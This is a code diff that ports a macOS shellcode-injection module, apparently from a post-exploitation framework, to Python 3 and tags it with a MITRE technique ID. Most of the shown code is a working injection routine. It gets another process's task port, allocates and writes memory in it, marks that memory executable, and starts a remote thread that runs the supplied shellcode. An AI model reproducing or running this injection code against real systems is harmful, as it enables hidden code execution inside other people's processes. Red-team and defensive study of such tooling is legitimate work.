@@ -1,9 +1,11 @@
+from __future__ import print_function
+from builtins import object
 from lib.common import helpers
 import os
 import base64
 
 
-class Module:
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -17,6 +19,10 @@ class Module:
 
             # more verbose multi-line description of the module
             'Description': ('Inject shellcode into a x64 bit process'),
+
+            'Software': '',
+
+            'Techniques': ['T1064'],
 
             # True if the module needs to run in the background
             'Background': False,
@@ -86,7 +92,7 @@ class Module:
         shellcodeBinPath =  self.options['Shellcode']['Value']
 
         if not os.path.exists(shellcodeBinPath):
-            print helpers.color("[!] Shellcode bin file not found.")
+            print(helpers.color("[!] Shellcode bin file not found."))
             return ""
 
         f = open(shellcodeBinPath, 'rb')
@@ -152,16 +158,16 @@ def run():
 
     result = libc.task_for_pid(libc.mach_task_self(), pid, ctypes.byref(remoteTask))
     if (result != KERN_SUCCESS):
-        print "Unable to get task for pid\\n"
-        return ""
+        print("Unable to get task for pid\\n")
+        return("")
 
     result = libc.mach_vm_allocate(remoteTask, ctypes.byref(remoteStack64), STACK_SIZE, VM_FLAGS_ANYWHERE)
     if result != KERN_SUCCESS:
-        print "Unable to allocate memory for the remote stack\\n"
+        print("Unable to allocate memory for the remote stack\\n")
         return ""
     result = libc.mach_vm_allocate(remoteTask, ctypes.byref(remoteCode64),len(shellcode),VM_FLAGS_ANYWHERE)
     if result != KERN_SUCCESS:
-        print "Unable to allocate memory for the remote code\\n"
+        print("Unable to allocate memory for the remote code\\n")
         return ""
 
     longptr = ctypes.POINTER(ctypes.c_ulong)
@@ -169,12 +175,12 @@ def run():
 
     result = libc.mach_vm_write(remoteTask, remoteCode64, shellcodePtr, len(shellcode))
     if result != KERN_SUCCESS:
-        print "Unable to write process memory\\n"
+        print("Unable to write process memory\\n")
         return ""
 
     result = libc.vm_protect(remoteTask, remoteCode64, len(shellcode),False, (VM_PROT_READ | VM_PROT_EXECUTE))
     if result != KERN_SUCCESS:
-        print "Unable to modify permissions for memory\\n"
+        print("Unable to modify permissions for memory\\n")
         return ""
 
     emptyarray = bytearray(sys.getsizeof(remoteThreadState64))
@@ -195,10 +201,10 @@ def run():
 
     result = libc.thread_create_running(remoteTask,x86_THREAD_STATE64, ctypes.byref(threadstate64), x86_THREAD_STATE64_COUNT, ctypes.byref(remoteThread))
     if (result != KERN_SUCCESS):
-        print "Unable to execute remote thread in process"
+        print("Unable to execute remote thread in process")
         return ""
 
-    print "Injected shellcode into process successfully!"
+    print("Injected shellcode into process successfully!")
 run()
 """
         script = script.replace('[SC]', shellcode)
